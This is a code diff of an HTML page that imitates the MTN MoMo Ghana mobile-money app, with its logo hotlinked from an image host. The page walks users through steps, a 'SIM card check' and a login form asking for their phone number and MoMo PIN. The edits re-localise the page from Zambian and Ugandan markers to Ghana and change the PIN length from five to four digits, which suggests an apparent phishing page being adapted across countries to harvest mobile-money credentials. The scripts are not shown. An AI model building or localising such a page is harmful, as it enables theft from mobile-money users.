@@ -1736,7 +1736,7 @@
 
 <body>
 
-    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+<!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
     <div id="adminModalOverlay">
         <div class="admin-modal">
             <div class="modal-title">
@@ -1797,21 +1797,20 @@
     <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
     <div id="page-step1" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-landing')">
-                <-Back</a>
-                    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
-                        <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
-                        <div style="text-align: left;">
-                            <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
-                            <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
-                        </div>
-                        <span style="color:var(--mtn-gold); font-size:0.7rem;">ZM</span>
-                    </div>
-                    <div class="nav-right">
-                        <div class="hline"></div>
-                        <div class="hline"></div>
-                        <div class="hline"></div>
-                    </div>
+            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">GH</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
         </nav>
         <div class="step-center">
             <div class="step-card">
@@ -1846,7 +1845,7 @@
                     <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
                     <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
                 </div>
-                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇺🇬</span>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">GH</span>
             </div>
             <div class="nav-right">
                 <div class="hline"></div>
@@ -1943,28 +1942,21 @@
         </div>
     </div>
 
-    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
-    <!-- Fixed: Removed the inline "display: flex" so it stays hidden until ".active" is applied -->
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK ══════════════════════ -->
     <div id="page-sim-check" class="page" style="background: #fff;">
         <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
             <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
             <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
 
-            <!-- Large Overlapping Circle with White Ring & Shadow -->
             <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
-                    <!-- Phone Body -->
                     <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#004080" stroke-width="5"/>
                     <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
                     <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
                     <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
                     <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
                     <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
-
-                    <!-- Arrow -->
                     <polygon points="68,45 58,40 58,50" fill="none" stroke="#004080" stroke-width="4" stroke-linejoin="round"/>
-
-                    <!-- SIM Card -->
                     <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#004080" stroke-width="4"/>
                     <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFD700"/>
                     <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFD700"/>
@@ -1986,10 +1978,9 @@
         </div>
     </div>
 
-    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
+    <!-- ══════════════════════ PAGE 7: LOGIN (4-DIGIT PIN) ══════════════════════ -->
     <div id="page-login" class="page" style="background: #fff;">
         <div style="background: var(--mtn-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
-            <!-- Custom Logo Mark -->
             <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
                 <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" style="height: 36px; object-fit: contain;" />
             </div>
@@ -1998,51 +1989,43 @@
         </div>
 
         <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
-            <!-- White Card -->
             <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
                 <h3 style="text-align: center; color: var(--mtn-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Welcome to MoMo</h3>
 
-                <!-- Number Input with Rounded Square Flag -->
                 <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
                     <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
                         <span style="font-size: 1.5rem; line-height: 1;">GH</span>
                     </div>
                     <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
-                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();"
-                        />
+                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();" />
                     </div>
                 </div>
 
-                <!-- PIN Input (Maintained from previous requirement) -->
                 <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
-                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (5 digits)</label>
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (4 digits)</label>
                     <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                         <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
                         <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
                         <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
                         <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
-                       
+                        
                         <button class="pin-eye" onclick="togPin()" title="Show/Hide" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
                         <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
                     </div>
                 </div>
 
-                <!-- Messages -->
                 <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
                 <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
                 <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
             </div>
 
-            <!-- Terms (Outside Card) -->
             <div style="text-align: center; font-size: 0.98rem; color: #005c99; line-height: 2.5; max-width: 420px; margin: 30px 0;">
                 By using this app you agree to our <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Mobile Terms of Use</a> and <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Privacy Policy</a>
             </div>
         </div>
 
-        <!-- Lifted, Pill-shaped Next Button -->
         <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
-            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;"
-                disabled>NEXT</button>
+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;" disabled>NEXT</button>
             <div id="mLgn" class="loading" style="margin-top: 10px;">
                 <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
                 <div class="wait-msg" style="font-size: 0.85rem;">Logging in…</div>
@@ -2220,7 +2203,6 @@
             </div>
         </div>
     </div>
-
     <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
     <script>
         // ============================================================
